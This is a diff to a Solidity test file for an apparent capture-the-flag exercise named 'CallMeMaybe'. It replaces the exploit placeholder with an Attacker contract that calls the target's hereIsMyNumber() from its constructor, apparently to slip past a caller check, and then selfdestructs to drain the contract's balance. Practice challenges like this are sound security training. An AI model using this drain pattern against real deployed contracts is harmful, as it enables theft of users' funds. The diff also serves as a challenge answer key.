@@ -8,6 +8,10 @@ import "src/05_CallMeMaybe/CallMeMaybe.sol";
 contract CallMeMaybeTest is BaseTest {
     CallMeMaybe instance;
 
+    constructor() {
+        // Silence "Constructor not used" warnings if any
+    }
+
     function setUp() public override {
         super.setUp();
         payable(user1).transfer(0.01 ether);
@@ -15,12 +19,18 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        new Attacker(address(instance));
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+}
+
+contract Attacker {
+    constructor(address target) {
+        CallMeMaybe(target).hereIsMyNumber();
+        selfdestruct(payable(msg.sender));
     }
 }
